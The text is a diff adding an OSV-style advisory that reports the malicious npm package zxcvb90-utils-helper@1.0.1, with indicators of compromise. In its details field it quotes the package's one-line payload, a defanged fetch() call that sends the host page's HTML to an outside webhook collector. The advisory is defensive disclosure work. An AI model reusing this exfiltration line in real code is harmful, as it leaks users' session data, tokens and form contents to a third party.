@@ -1,0 +1,64 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-13059",
+  "modified": "2026-10-14T23:56:18Z",
+  "published": "2026-10-14T23:55:40Z",
+  "summary": "Malicious code in zxcvb90-utils-helper (npm)",
+  "details": "zxcvb90-utils-helper@1.0.1 is a browser-side data-exfiltration package. Its entire payload is package/index.js, which runs on load and sends the host page's rendered DOM to an attacker-controlled collector: fetch('hxxps://webhook[.]site/ce5b0917-ae74-44c3-8a62-8a4e5003d44d?h=' + encodeURIComponent(document.documentElement.outerHTML.slice(0,4000))). Any page that loads this package leaks up to 4000 characters of its HTML — including form fields, tokens or session data rendered into the DOM — to that endpoint. The package ships no other functionality: package.json has an empty description, no repository, no lifecycle scripts, and declares itself as its own dependency with the bogus range \"^0.0.0-stage\". IOC: hxxps://webhook[.]site/ce5b0917-ae74-44c3-8a62-8a4e5003d44d",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "zxcvb90-utils-helper",
+        "purl": "pkg:npm/zxcvb90-utils-helper"
+      },
+      "versions": [
+        "1.0.1"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/zxcvb90-utils-helper/v/1.0.1"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-13059"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-10-14T23:55:40Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "webhook[.]site"
+        ],
+        "sha256": [
+          "24b899f7002f3d7010f30dbacbeb82096d322952d8f9e34e4fa2c246610209f2"
+        ],
+        "url_observed": [
+          "hxxps://webhook[.]site/ce5b0917-ae74-44c3-8a62-8a4e5003d44d"
+        ]
+      }
+    }
+  }
+}
